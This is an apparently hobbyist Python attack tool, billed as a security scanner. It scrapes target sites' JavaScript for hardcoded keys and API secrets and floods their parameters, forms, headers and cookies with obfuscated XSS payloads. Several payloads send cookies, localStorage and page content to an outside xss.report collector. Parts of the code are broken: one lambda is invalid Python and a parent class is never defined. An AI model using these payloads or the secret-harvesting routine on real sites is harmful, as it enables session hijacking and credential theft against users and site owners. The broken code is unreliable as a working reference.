#!/usr/bin/env python3
"""
*UÇK* Enhanced Modular Security Scanner v3.0
Advanced JS Analysis + XSS.report Integration
Vetem per Amigo Te Certifikuar *UÇK*
"""

import subprocess
import requests
import json
import sys
import argparse
import re
import time
import dns.resolver
import urllib3
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, unquote
from datetime import datetime
from pathlib import Path
from bs4 import BeautifulSoup
import random
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ==================== JAVASCRIPT CRYPTO ANALYZER MODULE ====================

class JavaScriptCryptoAnalyzer:
    """Advanced JavaScript analysis for cryptographic implementations"""
    
    def __init__(self, targets):
        self.targets = targets
        self.findings = []
        self.js_files = []
        self.crypto_patterns = {
            'aes_implementations': [
                r'CryptoJS\.AES\.',
                r'AES\.encrypt',
                r'AES\.decrypt',
                r'aes256',
                r'aes128',
                r'aes192',
                r'AES_(?:128|192|256)_(?:ECB|CBC|CTR|OFB|CFB|GCM)',
                r'createCipher.*aes',
                r'createDecipher.*aes',
                r'crypto\.subtle\.encrypt.*AES',
                r'crypto\.subtle\.decrypt.*AES',
                r'new\s+AES\(',
                r'AesCbc|AesCtr|AesGcm',
                r'rijndael',
                r'Rijndael',
                r'window\.crypto\.subtle\.importKey.*AES'
            ],
            'encryption_keys': [
                r'(?:key|KEY|Key)\s*[:=]\s*["\'][a-fA-F0-9]{32,64}["\']',
                r'(?:secret|SECRET|Secret)\s*[:=]\s*["\'][^"\']{16,}["\']',
                r'(?:password|PASSWORD|Password)\s*[:=]\s*["\'][^"\']+["\']',
                r'(?:apiKey|api_key|API_KEY)\s*[:=]\s*["\'][^"\']+["\']',
                r'(?:private_key|privateKey|PRIVATE_KEY)\s*[:=]\s*["\'][^"\']+["\']',
                r'generateKey.*AES',
                r'deriveKey.*AES',
                r'importKey.*raw.*AES',
                r'pbkdf2.*AES'
            ],
            'weak_crypto': [
                r'Math\.random\(\)',
                r'MD5\(',
                r'SHA1\(',
                r'DES\.',
                r'RC4',
                r'ECB',
                r'\.createHash\(["\']md5["\']',
                r'\.createHash\(["\']sha1["\']',
                r'crypto\.pseudoRandomBytes',
                r'Math\.floor\(Math\.random'
            ],
            'crypto_libraries': [
                r'crypto-js(?:\.min)?\.js',
                r'sjcl(?:\.min)?\.js',
                r'forge(?:\.min)?\.js',
                r'jsencrypt(?:\.min)?\.js',
                r'jsrsasign(?:\.min)?\.js',
                r'webcrypto-shim(?:\.min)?\.js',
                r'aes(?:\.min)?\.js',
                r'bcrypt(?:\.min)?\.js',
                r'scrypt(?:\.min)?\.js',
                r'argon2(?:\.min)?\.js'
            ],
            'hardcoded_secrets': [
                r'["\'](?:AIza[0-9A-Za-z_-]{35})["\']',  # Google API
                r'["\'](?:sk_live_[0-9a-zA-Z]{24,})["\']',  # Stripe
                r'["\'](?:rk_live_[0-9a-zA-Z]{24,})["\']',  # Stripe
                r'["\'](?:AC[a-z0-9]{32})["\']',  # Twilio
                r'["\'](?:SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43})["\']',  # SendGrid
                r'["\'](?:key-[0-9a-zA-Z]{32})["\']',  # Mailgun
                r'(?:aws_access_key_id|AWS_ACCESS_KEY_ID)\s*[:=]\s*["\'][A-Z0-9]{20}["\']',
                r'(?:aws_secret_access_key|AWS_SECRET_ACCESS_KEY)\s*[:=]\s*["\'][A-Za-z0-9/+=]{40}["\']'
            ],
            'iv_patterns': [
                r'(?:iv|IV|Iv)\s*[:=]\s*["\'][a-fA-F0-9]{16,32}["\']',
                r'(?:nonce|NONCE|Nonce)\s*[:=]\s*["\'][a-fA-F0-9]{16,}["\']',
                r'(?:salt|SALT|Salt)\s*[:=]\s*["\'][^"\']+["\']',
                r'generateIV\(',
                r'randomBytes\(16\)',
                r'crypto\.getRandomValues'
            ]
        }
    
    def run(self):
        """Execute JavaScript crypto analysis"""
        print(f"\n{Colors.HEADER}{'='*60}")
        print("MODULE: JAVASCRIPT CRYPTOGRAPHY ANALYZER")
        print(f"{'='*60}{Colors.END}\n")
        
        for target in self.targets:
            self.analyze_target(target)
        
        self.deep_analysis()
        self.generate_crypto_report()
        
        return self.findings
    
    def analyze_target(self, url):
        """Analyze JavaScript files from target"""
        print(f"{Colors.CYAN}[*] Analyzing: {url}{Colors.END}")
        
        try:
            # Get main page
            response = requests.get(url, timeout=10, verify=False, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all JavaScript files
            scripts = soup.find_all('script')
            
            # Extract external JS files
            for script in scripts:
                src = script.get('src')
                if src:
                    js_url = urljoin(url, src)
                    self.js_files.append(js_url)
                    self.analyze_js_file(js_url)
            
            # Analyze inline JavaScript
            for script in scripts:
                if not script.get('src') and script.string:
                    self.analyze_js_content(script.string, url + " (inline)")
            
            # Look for additional JS files in comments or lazy-loaded
            self.find_hidden_js(response.text, url)
            
        except Exception as e:
            print(f"{Colors.RED}    └─ Error: {str(e)}{Colors.END}")
    
    def analyze_js_file(self, js_url):
        """Analyze external JavaScript file"""
        try:
            print(f"{Colors.YELLOW}    ├─ Fetching: {js_url}{Colors.END}")
            response = requests.get(js_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                self.analyze_js_content(response.text, js_url)
                
                # Check for source maps
                if '//# sourceMappingURL=' in response.text:
                    self.analyze_source_map(js_url, response.text)
        except Exception as e:
            print(f"{Colors.RED}    └─ Failed to fetch: {str(e)}{Colors.END}")
    
    def analyze_js_content(self, content, source):
        """Analyze JavaScript content for crypto patterns"""
        findings_count = 0
        
        # Check for AES implementations
        for pattern in self.crypto_patterns['aes_implementations']:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                context = self.get_context(content, match.start(), match.end())
                finding = {
                    'type': 'AES Implementation',
                    'source': source,
                    'pattern': pattern,
                    'match': match.group(),
                    'context': context,
                    'severity': 'INFO',
                    'line': content[:match.start()].count('\n') + 1
                }
                self.findings.append(finding)
                findings_count += 1
                print(f"{Colors.GREEN}        └─ Found AES: {match.group()[:50]}...{Colors.END}")
        
        # Check for encryption keys
        for pattern in self.crypto_patterns['encryption_keys']:
            matches = re.finditer(pattern, content)
            for match in matches:
                # Validate if it's a real key
                if self.is_valid_key(match.group()):
                    context = self.get_context(content, match.start(), match.end())
                    finding = {
                        'type': 'Hardcoded Encryption Key',
                        'source': source,
                        'pattern': pattern,
                        'match': self.sanitize_key(match.group()),
                        'context': context,
                        'severity': 'CRITICAL',
                        'line': content[:match.start()].count('\n') + 1
                    }
                    self.findings.append(finding)
                    findings_count += 1
                    print(f"{Colors.RED}        └─ CRITICAL: Hardcoded key found!{Colors.END}")
        
        # Check for weak crypto
        for pattern in self.crypto_patterns['weak_crypto']:
            matches = re.finditer(pattern, content)
            for match in matches:
                context = self.get_context(content, match.start(), match.end())
                finding = {
                    'type': 'Weak Cryptography',
                    'source': source,
                    'pattern': pattern,
                    'match': match.group(),
                    'context': context,
                    'severity': 'HIGH',
                    'line': content[:match.start()].count('\n') + 1
                }
                self.findings.append(finding)
                findings_count += 1
                print(f"{Colors.YELLOW}        └─ Weak crypto: {match.group()}{Colors.END}")
        
        # Check for hardcoded secrets
        for pattern in self.crypto_patterns['hardcoded_secrets']:
            matches = re.finditer(pattern, content)
            for match in matches:
                finding = {
                    'type': 'Hardcoded API Secret',
                    'source': source,
                    'pattern': 'API Key Pattern',
                    'match': self.sanitize_key(match.group()),
                    'severity': 'CRITICAL',
                    'line': content[:match.start()].count('\n') + 1
                }
                self.findings.append(finding)
                findings_count += 1
                print(f"{Colors.RED}        └─ CRITICAL: API Secret found!{Colors.END}")
        
        # Check for IV patterns
        for pattern in self.crypto_patterns['iv_patterns']:
            matches = re.finditer(pattern, content)
            for match in matches:
                context = self.get_context(content, match.start(), match.end())
                finding = {
                    'type': 'IV/Nonce Configuration',
                    'source': source,
                    'pattern': pattern,
                    'match': match.group()[:100],
                    'context': context,
                    'severity': 'MEDIUM',
                    'line': content[:match.start()].count('\n') + 1
                }
                self.findings.append(finding)
                findings_count += 1
        
        if findings_count > 0:
            print(f"{Colors.CYAN}        └─ Total findings: {findings_count}{Colors.END}")
    
    def get_context(self, content, start, end, context_size=150):
        """Get context around a match"""
        context_start = max(0, start - context_size)
        context_end = min(len(content), end + context_size)
        context = content[context_start:context_end]
        return context.replace('\n', ' ')[:300]
    
    def is_valid_key(self, potential_key):
        """Validate if string is likely a real key"""
        # Remove quotes and spaces
        key = re.sub(r'["\'\s]', '', potential_key)
        
        # Check for patterns that indicate real keys
        if len(key) < 10:
            return False
        
        # Check for high entropy (not all same character)
        if len(set(key)) < 5:
            return False
        
        # Check if it's not a placeholder
        placeholders = ['example', 'test', 'demo', 'sample', 'xxxxx', '00000', '11111']
        for placeholder in placeholders:
            if placeholder in key.lower():
                return False
        
        return True
    
    def sanitize_key(self, key):
        """Sanitize key for safe display"""
        if len(key) > 20:
            return key[:10] + '...[REDACTED]...' + key[-5:]
        return key[:5] + '...[REDACTED]'
    
    def find_hidden_js(self, html_content, base_url):
        """Find hidden or dynamically loaded JS files"""
        # Look for JS files in comments
        comment_pattern = r'<!--[\s\S]*?-->'
        comments = re.findall(comment_pattern, html_content)
        
        for comment in comments:
            js_refs = re.findall(r'["\']([^"\']*\.js[^"\']*)["\'"]', comment)
            for js_ref in js_refs:
                js_url = urljoin(base_url, js_ref)
                if js_url not in self.js_files:
                    self.js_files.append(js_url)
                    print(f"{Colors.YELLOW}    ├─ Found hidden JS: {js_url}{Colors.END}")
                    self.analyze_js_file(js_url)
        
        # Look for webpack chunks
        webpack_patterns = [
            r'webpackJsonp',
            r'__webpack_require__',
            r'webpackChunkName',
            r'\.chunk\.js'
        ]
        
        for pattern in webpack_patterns:
            if pattern in html_content:
                print(f"{Colors.CYAN}    └─ Webpack detected - may contain bundled crypto{Colors.END}")
    
    def analyze_source_map(self, js_url, js_content):
        """Analyze source maps for original source"""
        source_map_match = re.search(r'//# sourceMappingURL=(.+)$', js_content, re.MULTILINE)
        if source_map_match:
            map_url = urljoin(js_url, source_map_match.group(1))
            print(f"{Colors.CYAN}    ├─ Source map found: {map_url}{Colors.END}")
            
            try:
                response = requests.get(map_url, timeout=10, verify=False)
                if response.status_code == 200:
                    map_data = response.json()
                    # Analyze sources in source map
                    if 'sources' in map_data:
                        for source in map_data['sources']:
                            if 'crypto' in source.lower() or 'aes' in source.lower():
                                print(f"{Colors.GREEN}        └─ Crypto source: {source}{Colors.END}")
            except:
                pass
    
    def deep_analysis(self):
        """Perform deep analysis on findings"""
        print(f"\n{Colors.BOLD}[+] Performing deep crypto analysis...{Colors.END}")
        
        # Group findings by type
        findings_by_type = {}
        for finding in self.findings:
            ftype = finding['type']
            if ftype not in findings_by_type:
                findings_by_type[ftype] = []
            findings_by_type[ftype].append(finding)
        
        # Analyze AES implementations
        if 'AES Implementation' in findings_by_type:
            aes_findings = findings_by_type['AES Implementation']
            print(f"{Colors.CYAN}    ├─ Found {len(aes_findings)} AES implementations{Colors.END}")
            
            # Check for vulnerable modes
            for finding in aes_findings:
                if 'ECB' in finding.get('context', ''):
                    finding['severity'] = 'HIGH'
                    finding['vulnerability'] = 'ECB mode is vulnerable to pattern analysis'
                    print(f"{Colors.RED}        └─ VULNERABLE: ECB mode detected!{Colors.END}")
                
                if 'CBC' in finding.get('context', '') and 'PKCS7' not in finding.get('context', ''):
                    finding['vulnerability'] = 'CBC without proper padding can be vulnerable'
                    print(f"{Colors.YELLOW}        └─ Warning: Check CBC padding scheme{Colors.END}")
        
        # Correlate keys with implementations
        if 'Hardcoded Encryption Key' in findings_by_type:
            keys = findings_by_type['Hardcoded Encryption Key']
            print(f"{Colors.RED}    ├─ Found {len(keys)} hardcoded keys - CRITICAL ISSUE{Colors.END}")
            
            for key in keys:
                # Try to find where key is used
                for finding in self.findings:
                    if finding['type'] == 'AES Implementation' and finding['source'] == key['source']:
                        key['usage'] = 'Likely used in AES implementation'
                        print(f"{Colors.RED}        └─ Key is actively used in crypto!{Colors.END}")
    
    def generate_crypto_report(self):
        """Generate detailed crypto analysis report"""
        print(f"\n{Colors.HEADER}{'='*60}")
        print("CRYPTOGRAPHY ANALYSIS REPORT")
        print(f"{'='*60}{Colors.END}")
        
        # Statistics
        print(f"{Colors.BOLD}Statistics:{Colors.END}")
        print(f"  Total JS files analyzed: {len(self.js_files)}")
        print(f"  Total findings: {len(self.findings)}")
        
        # Group by severity
        severity_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        for finding in self.findings:
            severity_count[finding.get('severity', 'INFO')] += 1
        
        print(f"\n{Colors.BOLD}Findings by Severity:{Colors.END}")
        print(f"{Colors.RED}  CRITICAL: {severity_count['CRITICAL']}{Colors.END}")
        print(f"{Colors.RED}  HIGH: {severity_count['HIGH']}{Colors.END}")
        print(f"{Colors.YELLOW}  MEDIUM: {severity_count['MEDIUM']}{Colors.END}")
        print(f"{Colors.BLUE}  LOW: {severity_count['LOW']}{Colors.END}")
        print(f"{Colors.CYAN}  INFO: {severity_count['INFO']}{Colors.END}")
        
        # Top critical findings
        critical = [f for f in self.findings if f.get('severity') == 'CRITICAL']
        if critical:
            print(f"\n{Colors.BOLD}Critical Findings:{Colors.END}")
            for i, finding in enumerate(critical[:5], 1):
                print(f"{Colors.RED}  {i}. {finding['type']} in {finding['source'][:50]}...{Colors.END}")
                if 'match' in finding:
                    print(f"     Match: {finding['match']}")


# ==================== ADVANCED XSS MODULE WITH XSS.REPORT ====================

class AdvancedXSSScanner:
    """Advanced XSS Scanner with xss.report integration"""
    
    def __init__(self, targets, xss_report_id='zqz'):
        self.targets = targets
        self.xss_report_id = xss_report_id
        self.vulnerabilities = []
        self.xss_report_url = f"https://xss.report/c/{xss_report_id}"
        
        # Generate unique identifier for this scan
        self.scan_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        # Advanced XSS payloads with xss.report callbacks
        self.advanced_payloads = self.generate_advanced_payloads()
    
    def generate_advanced_payloads(self):
        """Generate advanced XSS payloads with callbacks"""
        base_callback = f"{self.xss_report_url}?scan={self.scan_id}"
        
        payloads = [
            # Basic callbacks
            f"<script>fetch('{base_callback}&t=basic')</script>",
            f"<img src=x onerror=\"fetch('{base_callback}&t=img')\">",
            f"<svg onload=\"fetch('{base_callback}&t=svg')\">",
            
            # Advanced event handlers
            f"<body onload=\"fetch('{base_callback}&t=body')\">",
            f"<iframe src=\"javascript:fetch('{base_callback}&t=iframe')\">",
            f"<object data=\"javascript:fetch('{base_callback}&t=object')\">",
            f"<embed src=\"javascript:fetch('{base_callback}&t=embed')\">",
            
            # Bypass attempts with callbacks
            f"<scr<script>ipt>fetch('{base_callback}&t=bypass1')</script>",
            f"<img src=x onerror=\"window['fetch']('{base_callback}&t=bypass2')\">",
            f"<svg/onload=\"fetch('{base_callback}&t=bypass3')\">",
            f"<img src=\"x\" onerror=\"eval('fetch(\\''+'{base_callback}&t=eval'+'\\')')\">",
            
            # Data exfiltration payloads
            f"<script>fetch('{base_callback}&cookies='+encodeURIComponent(document.cookie))</script>",
            f"<script>fetch('{base_callback}&dom='+encodeURIComponent(document.documentElement.innerHTML.substring(0,1000)))</script>",
            f"<script>fetch('{base_callback}&url='+encodeURIComponent(window.location.href))</script>",
            f"<script>fetch('{base_callback}&localStorage='+encodeURIComponent(JSON.stringify(localStorage)))</script>",
            
            # Polyglot payloads
            f"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+fetch('{base_callback}&t=polyglot')//'>",
            
            # DOM XSS payloads
            f"#<script>fetch('{base_callback}&t=dom1')</script>",
            f"javascript:fetch('{base_callback}&t=dom2')",
            f"data:text/html,<script>fetch('{base_callback}&t=dom3')</script>",
            
            # Filter bypass techniques
            f"<img src=x onerror=\\x66\\x65\\x74\\x63\\x68('{base_callback}&t=hex')>",
            f"<img src=x onerror=\\146\\145\\164\\143\\150('{base_callback}&t=octal')>",
            f"<img src=x onerror=\"&#102;&#101;&#116;&#99;&#104;('{base_callback}&t=dec')\">",
            
            # Event handler variations
            f"<div onmouseover=\"fetch('{base_callback}&t=mouseover')\">HOVER ME</div>",
            f"<input autofocus onfocus=\"fetch('{base_callback}&t=autofocus')\">",
            f"<select autofocus onfocus=\"fetch('{base_callback}&t=select')\">",
            f"<textarea autofocus onfocus=\"fetch('{base_callback}&t=textarea')\">",
            f"<keygen autofocus onfocus=\"fetch('{base_callback}&t=keygen')\">",
            
            # Modern HTML5 vectors
            f"<video><source onerror=\"fetch('{base_callback}&t=video')\">",
            f"<audio src=x onerror=\"fetch('{base_callback}&t=audio')\">",
            f"<details open ontoggle=\"fetch('{base_callback}&t=details')\">",
            f"<marquee onstart=\"fetch('{base_callback}&t=marquee')\">",
            
            # JSON/JSONP injection
            f"');fetch('{base_callback}&t=json');//",
            f"\";fetch('{base_callback}&t=json2');//",
            f"'}});fetch('{base_callback}&t=jsonp');//",
            
            # Template injection attempts
            f"{{7*7}}{{fetch('{base_callback}&t=template')}}",
            f"${7*7}${fetch('{base_callback}&t=template2')}",
            f"<%= 7*7 %><% fetch('{base_callback}&t=template3') %>",
        ]
        
        # Add more sophisticated payloads
        for i in range(5):
            # Generate random obfuscation
            obfuscated = self.obfuscate_payload(f"fetch('{base_callback}&t=obfuscated{i}')")
            payloads.append(f"<img src=x onerror=\"{obfuscated}\">")
        
        return payloads
    
    def obfuscate_payload(self, payload):
        """Obfuscate JavaScript payload"""
        techniques = [
            lambda p: p.replace('fetch', 'window[\"fe\"+\"tch\"]'),
            lambda p: p.replace('fetch', 'window[\\x66\\x65\\x74\\x63\\x68]'),
            lambda p: p.replace('(', String.fromCharCode(40)).replace(')', String.fromCharCode(41)'),
            lambda p: f"eval(atob('{base64.b64encode(p.encode()).decode()}'))",
            lambda p: f"Function('{p}')()"
        ]
        
        return random.choice(techniques)(payload)
    
    def run(self):
        """Execute advanced XSS scanning"""
        print(f"\n{Colors.HEADER}{'='*60}")
        print("MODULE: ADVANCED XSS SCANNER WITH XSS.REPORT")
        print(f"{'='*60}{Colors.END}\n")
        
        print(f"{Colors.CYAN}[*] XSS Report URL: {self.xss_report_url}{Colors.END}")
        print(f"{Colors.CYAN}[*] Scan ID: {self.scan_id}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Total payloads: {len(self.advanced_payloads)}{Colors.END}\n")
        
        for target in self.targets:
            self.scan_target(target)
        
        print(f"\n{Colors.GREEN}[✓] Advanced XSS scan complete. Found {len(self.vulnerabilities)} vulnerabilities{Colors.END}")
        print(f"{Colors.YELLOW}[!] Check your XSS.report dashboard for callbacks: {self.xss_report_url}{Colors.END}")
        
        return self.vulnerabilities
    
    def scan_target(self, url):
        """Comprehensive XSS scanning with multiple techniques"""
        print(f"{Colors.CYAN}[*] Scanning: {url}{Colors.END}")
        
        # 1. Test GET parameters
        self.test_get_parameters(url)
        
        # 2. Test POST forms
        self.test_post_forms(url)
        
        # 3. Test headers
        self.test_headers(url)
        
        # 4. Test cookies
        self.test_cookies(url)
        
        # 5. Test URL fragments
        self.test_fragments(url)
    
    def test_get_parameters(self, url):
        """Test GET parameters for XSS"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Try common parameter names
            common_params = ['q', 'search', 'query', 'id', 'page', 'url', 'redirect', 'next', 'data', 'text', 'name', 'email']
            for param in common_params:
                test_url = f"{url}?{param}=test"
                self.test_parameter_with_payloads(test_url, param)
        else:
            for param_name in params:
                self.test_parameter_with_payloads(url, param_name)
    
    def test_parameter_with_payloads(self, url, param_name):
        """Test specific parameter with all payloads"""
        print(f"{Colors.YELLOW}    ├─ Testing parameter: {param_name}{Colors.END}")
        
        success_count = 0
        
        for i, payload in enumerate(self.advanced_payloads):
            try:
                # Prepare URL with payload
                parsed = urlparse(url)
                params = parse_qs(parsed.query) if parsed.query else {}
                params[param_name] = [payload]
                
                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                # Send request
                headers = {
                    'User-Agent': f'XSSScanner/{self.scan_id}',
                    'X-XSS-Test': self.scan_id
                }
                
                response = requests.get(test_url, timeout=10, verify=False, headers=headers, allow_redirects=False)
                
                # Check if payload is reflected
                if self.check_reflection(response, payload, param_name):
                    success_count += 1
                
                # Rate limiting
                if i % 10 == 0:
                    time.sleep(0.5)
                
            except Exception as e:
                continue
        
        if success_count > 0:
            print(f"{Colors.GREEN}        └─ {success_count} payloads successfully injected!{Colors.END}")
    
    def check_reflection(self, response, payload, param_name):
        """Check if payload is reflected and executable"""
        reflected = False
        executable = False
        
        # Check if payload is in response
        if payload in response.text:
            reflected = True
            
            # Check if it's properly reflected (not encoded)
            if not self.is_encoded(payload, response.text):
                executable = True
                
                vuln = {
                    'type': 'Reflected XSS (Callback)',
                    'severity': 'HIGH',
                    'url': response.url,
                    'parameter': param_name,
                    'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                    'xss_report_id': self.xss_report_id,
                    'scan_id': self.scan_id,
                    'evidence': 'Payload reflected without encoding - Check XSS.report for callback'
                }
                self.vulnerabilities.append(vuln)
                print(f"{Colors.RED}        └─ XSS FOUND! Payload injected - Check {self.xss_report_url}{Colors.END}")
                return True
        
        # Check response headers for reflection
        for header, value in response.headers.items():
            if payload in value:
                vuln = {
                    'type': 'Header Injection XSS',
                    'severity': 'MEDIUM',
                    'url': response.url,
                    'parameter': param_name,
                    'header': header,
                    'payload': payload[:50]
                }
                self.vulnerabilities.append(vuln)
                print(f"{Colors.YELLOW}        └─ Header injection detected in {header}{Colors.END}")
                return True
        
        return False
    
    def is_encoded(self, payload, response_text):
        """Check if payload is HTML-encoded in response"""
        encoded_chars = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;'
        }
        
        for char, encoded in encoded_chars.items():
            if char in payload and encoded in response_text:
                return True
        
        return False
    
    def test_post_forms(self, url):
        """Test POST forms for XSS"""
        print(f"{Colors.YELLOW}    ├─ Checking for forms...{Colors.END}")
        
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                if method == 'post':
                    form_url = urljoin(url, action)
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    
                    for input_field in inputs:
                        input_name = input_field.get('name')
                        if input_name:
                            self.test_post_parameter(form_url, input_name)
        except Exception as e:
            pass
    
    def test_post_parameter(self, url, param_name):
        """Test POST parameter for XSS"""
        print(f"{Colors.YELLOW}        ├─ Testing POST param: {param_name}{Colors.END}")
        
        for payload in self.advanced_payloads[:10]:  # Test subset for POST
            try:
                data = {param_name: payload}
                headers = {
                    'User-Agent': f'XSSScanner/{self.scan_id}',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                response = requests.post(url, data=data, timeout=10, verify=False, headers=headers)
                
                if payload in response.text and not self.is_encoded(payload, response.text):
                    vuln = {
                        'type': 'Stored/Reflected XSS (POST)',
                        'severity': 'HIGH',
                        'url': url,
                        'parameter': param_name,
                        'method': 'POST',
                        'payload': payload[:100],
                        'xss_report_id': self.xss_report_id
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"{Colors.RED}            └─ POST XSS FOUND! Check {self.xss_report_url}{Colors.END}")
                    break
            except:
                continue
    
    def test_headers(self, url):
        """Test headers for XSS"""
        print(f"{Colors.YELLOW}    ├─ Testing headers injection...{Colors.END}")
        
        header_payloads = [
            'Referer',
            'User-Agent',
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Originating-IP',
            'X-Remote-IP',
            'X-Client-IP',
            'Client-IP',
            'X-Forwarded-Host',
            'Host'
        ]
        
        for header_name in header_payloads:
            for payload in self.advanced_payloads[:5]:  # Test subset
                try:
                    headers = {header_name: payload}
                    response = requests.get(url, headers=headers, timeout=10, verify=False)
                    
                    if payload in response.text and not self.is_encoded(payload, response.text):
                        vuln = {
                            'type': 'Header-based XSS',
                            'severity': 'MEDIUM',
                            'url': url,
                            'header': header_name,
                            'payload': payload[:50]
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"{Colors.YELLOW}            └─ Header XSS in {header_name}{Colors.END}")
                        break
                except:
                    continue
    
    def test_cookies(self, url):
        """Test cookies for XSS"""
        print(f"{Colors.YELLOW}    ├─ Testing cookie injection...{Colors.END}")
        
        cookie_names = ['session', 'user', 'id', 'token', 'auth', 'preference', 'data']
        
        for cookie_name in cookie_names:
            for payload in self.advanced_payloads[:3]:  # Test subset
                try:
                    cookies = {cookie_name: payload}
                    response = requests.get(url, cookies=cookies, timeout=10, verify=False)
                    
                    if payload in response.text and not self.is_encoded(payload, response.text):
                        vuln = {
                            'type': 'Cookie-based XSS',
                            'severity': 'MEDIUM',
                            'url': url,
                            'cookie': cookie_name,
                            'payload': payload[:50]
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"{Colors.YELLOW}            └─ Cookie XSS in {cookie_name}{Colors.END}")
                        break
                except:
                    continue
    
    def test_fragments(self, url):
        """Test URL fragments for DOM XSS"""
        print(f"{Colors.YELLOW}    └─ Testing DOM XSS via fragments...{Colors.END}")
        
        # Add fragment-based payloads
        fragment_payloads = [
            f"#<img src=x onerror=\"fetch('{self.xss_report_url}?t=fragment')\">",
            f"#javascript:fetch('{self.xss_report_url}?t=fragment2')",
            f"#{{'{{'}}<script>fetch('{self.xss_report_url}?t=fragment3')</script>{{'}}'}}"
        ]
        
        for payload in fragment_payloads:
            test_url = url + payload
            print(f"{Colors.CYAN}            └─ DOM XSS test: {test_url[:80]}...{Colors.END}")


# ==================== ENHANCED MAIN SCANNER ====================

class EnhancedMainScanner(MainScanner):
    """Enhanced main scanner with new modules"""
    
    def __init__(self, domain, output_file="scan_results.json", xss_report_id='zqz'):
        super().__init__(domain, output_file)
        self.xss_report_id = xss_report_id
        self.crypto_findings = []
        self.advanced_xss_findings = []
    
    def banner(self):
        print(f"""{Colors.CYAN}
╔═══════════════════════════════════════════════════════════════════════╗
║         ENHANCED MODULAR SECURITY SCANNER v3.0                        ║
║     JS Crypto Analysis + Advanced XSS.report Integration              ║
║                    *UÇK* Certified Edition                            ║
╚═══════════════════════════════════════════════════════════════════════╝
{Colors.END}""")
        print(f"{Colors.BLUE}[*] Target Domain: {Colors.BOLD}{self.domain}{Colors.END}")
        print(f"{Colors.BLUE}[*] XSS.report ID: {Colors.BOLD}{self.xss_report_id}{Colors.END}")
        print(f"{Colors.BLUE}[*] Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}\n")
    
    def run_enhanced_modules(self, modules):
        """Run enhanced scanning modules"""
        
        # Run original modules first
        self.run_modules([m for m in modules if m not in ['jscrypto', 'advancedxss']])
        
        if not self.live_hosts:
            print(f"{Colors.RED}[!] No live hosts found. Exiting.{Colors.END}")
            return
        
        # Module: JavaScript Crypto Analysis
        if 'jscrypto' in modules:
            print(f"\n{Colors.BOLD}[+] Running JavaScript Cryptography Analysis...{Colors.END}")
            crypto_analyzer = JavaScriptCryptoAnalyzer(self.live_hosts)
            self.crypto_findings = crypto_analyzer.run()
            
            # Add to main vulnerabilities
            for finding in self.crypto_findings:
                vuln = {
                    'type': f"JS Crypto: {finding['type']}",
                    'severity': finding.get('severity', 'INFO'),
                    'url': finding.get('source', 'Unknown'),
                    'details': finding
                }
                self.all_vulnerabilities.append(vuln)
        
        # Module: Advanced XSS with xss.report
        if 'advancedxss' in modules:
            print(f"\n{Colors.BOLD}[+] Running Advanced XSS Scanner with XSS.report...{Colors.END}")
            xss_scanner = AdvancedXSSScanner(self.live_hosts, self.xss_report_id)
            self.advanced_xss_findings = xss_scanner.run()
            self.all_vulnerabilities.extend(self.advanced_xss_findings)
    
    def generate_enhanced_report(self):
        """Generate enhanced comprehensive report"""
        report = {
            'domain': self.domain,
            'scan_time': datetime.now().isoformat(),
            'xss_report_id': self.xss_report_id,
            'statistics': {
                'subdomains_found': len(self.subdomains),
                'live_hosts': len(self.live_hosts),
                'total_vulnerabilities': len(self.all_vulnerabilities),
                'crypto_findings': len(self.crypto_findings),
                'advanced_xss_findings': len(self.advanced_xss_findings)
            },
            'subdomains': self.subdomains,
            'live_hosts': self.live_hosts,
            'vulnerabilities': self.all_vulnerabilities,
            'crypto_analysis': self.crypto_findings,
            'xss_callbacks': {
                'report_url': f"https://xss.report/c/{self.xss_report_id}",
                'findings': self.advanced_xss_findings
            }
        }
        
        # Save JSON report
        with open(self.output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Print enhanced summary
        print(f"\n{Colors.HEADER}{'='*60}")
        print("ENHANCED SCAN SUMMARY")
        print(f"{'='*60}{Colors.END}")
        print(f"{Colors.BLUE}Domain: {self.domain}{Colors.END}")
        print(f"{Colors.BLUE}Subdomains: {len(self.subdomains)}{Colors.END}")
        print(f"{Colors.BLUE}Live Hosts: {len(self.live_hosts)}{Colors.END}")
        print(f"{Colors.BLUE}Total Vulnerabilities: {len(self.all_vulnerabilities)}{Colors.END}")
        print(f"{Colors.CYAN}Crypto Findings: {len(self.crypto_findings)}{Colors.END}")
        print(f"{Colors.CYAN}XSS Callbacks Expected: {len(self.advanced_xss_findings)}{Colors.END}")
        
